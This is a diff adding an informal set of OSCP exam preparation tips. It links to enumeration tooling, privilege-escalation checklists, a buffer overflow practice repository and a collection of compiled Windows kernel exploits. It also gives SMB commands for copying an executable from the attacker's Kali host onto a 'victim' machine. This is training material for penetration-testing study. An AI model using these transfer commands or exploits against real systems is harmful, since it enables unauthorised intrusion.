@@ -1,0 +1,26 @@
+Tips For OSCP Exam preparation
+
+Enumeration : 
+just use autorecon
+https://github.com/Tib3rius/AutoRecon
+
+Privilege escalation:
+Check list for windows and linux.
+Windows:
+https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation?fbclid=IwAR3y1E4QUXt-Picl9SpNg4HgTsWzVLvrocXxXBwQCPh6gCLcRbGx-J1T2Fc
+Linux :
+https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist?fbclid=IwAR39s58Ye-2pAvkiu6AuRRV_snMS7jEGgfZCf9HdbDdeRczEqRlvALJeOwg
+
+Buffer over flow
+check this , its just like  buffer over flow machine in OSCP Exam
+https://github.com/r4j0x00/oscp-like-stack-buffer-overflow
+
+Some other tibs
+The Easiest way to transfare data between windows and your kali linux is :
+on kali use : smbserver.py <dir to share> <sharename>
+on victum machene : copy \\<yourkaliIPAdress>\sharename\example.exe
+
+here you can find most of windows kernel exploits compiled (you don't need to face gcc errors)
+https://github.com/SecWiki/windows-kernel-exploits
+
+i will update this post if i find some special stuff
